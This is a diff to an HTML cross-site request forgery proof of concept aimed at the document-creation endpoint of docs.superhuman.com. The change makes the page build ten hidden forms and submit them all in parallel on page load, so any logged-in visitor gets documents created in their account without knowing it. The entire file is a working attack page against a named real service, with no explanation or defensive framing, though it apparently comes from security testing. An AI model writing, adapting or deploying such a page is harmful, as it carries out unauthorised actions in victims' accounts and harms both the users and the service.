@@ -1,19 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CSRF PoC - Parallel Form Submission</title>
+</head>
 <body>
-<form id="csrfForm" action="https://docs.superhuman.com/newdoc/CSRF_PoC_Create_New_Document_In_My_Docs_folder" method="POST">
-</form>
+<div id="formsContainer"></div>
 
 <script>
-    let count = 0;
     const maxDocsToCreate = 10;
-    function submitForm(){
-        if (count < maxDocsToCreate) {
-            document.getElementById('csrfForm').submit();
-            count++;
-        }
+    const targetUrl = "https://docs.superhuman.com/newdoc/CSRF_PoC_Create_New_Document_In_My_Docs_folder";
+    
+    // Create all forms
+    const formsContainer = document.getElementById('formsContainer');
+    const forms = [];
+    
+    for (let i = 0; i < maxDocsToCreate; i++) {
+        const form = document.createElement('form');
+        form.id = `csrfForm_${i}`;
+        form.action = targetUrl;
+        form.method = 'POST';
+        form.style.display = 'none';
+        formsContainer.appendChild(form);
+        forms.push(form);
     }
-    submitForm();
+    
+    // Submit all forms in parallel
+    function submitAllFormsParallel() {
+        forms.forEach((form, index) => {
+            // Use setTimeout with 0ms to ensure async execution
+            setTimeout(() => {
+                form.submit();
+            }, 0);
+        });
+    }
+    
+    // Execute on page load
+    submitAllFormsParallel();
 </script>
 </body>
 </html>
